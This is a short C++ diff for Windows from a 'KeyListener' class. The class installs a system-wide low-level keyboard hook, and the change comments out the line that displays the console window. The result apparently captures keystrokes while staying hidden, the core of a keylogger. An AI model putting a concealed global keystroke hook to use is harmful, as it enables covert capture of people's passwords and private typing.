@@ -71,7 +71,7 @@ int KeyListener::execute() {
 
   keyEvents = getKeyEvents();
 
-  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
+//  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
 
   if (!(hook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
 	MessageBox(NULL, "Nope", "Error", MB_ICONERROR);
